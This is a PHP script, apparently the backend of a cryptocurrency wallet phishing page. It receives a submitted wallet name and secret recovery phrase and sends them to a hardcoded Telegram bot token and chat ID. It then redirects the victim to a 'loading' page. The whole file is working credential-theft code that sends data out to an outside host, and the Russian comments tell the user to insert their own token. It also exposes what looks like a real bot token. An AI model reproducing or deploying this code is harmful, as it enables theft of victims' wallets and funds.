<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$request_method = $_SERVER['REQUEST_METHOD'] ?? '';

if ($request_method == "POST") {
    if (isset($_POST['wallet_name']) && isset($_POST['secret_phrase'])) {
        $wallet_name = htmlspecialchars($_POST['wallet_name']);
        $secret_phrase = htmlspecialchars($_POST['secret_phrase']);

        $telegramToken = '7378550796:AAE5NSymAfD5wfhiGZjZ-yrEpMY5GvJ5IEY'; // Замените на ваш токен
        $chatId = '793848402'; // Замените на ваш chat ID

        $message = "Wallet Name: $wallet_name\nSecret Phrase: $secret_phrase";
        $text = urlencode($message);

        $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage?chat_id={$chatId}&text={$text}";
        echo "Сгенерированный URL: $url<br>"; // Для отладки

        // Используем CURL для отправки запроса
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);

        if ($response === false) {
            die('CURL ошибка: ' . curl_error($ch));
        }

        $decodedResponse = json_decode($response, true);
        curl_close($ch);

        if (isset($decodedResponse['ok']) && $decodedResponse['ok']) {
            echo "Сообщение успешно отправлено!";
        } else {
            echo 'Ошибка при отправке сообщения: ' . (isset($decodedResponse['description']) ? $decodedResponse['description'] : 'неизвестная ошибка');
        }

        header("Location: loading.html");
        exit();
    } else {
        echo "Не все поля заполнены.";
    }
} else {
    echo "Неверный метод запроса.";
}
?>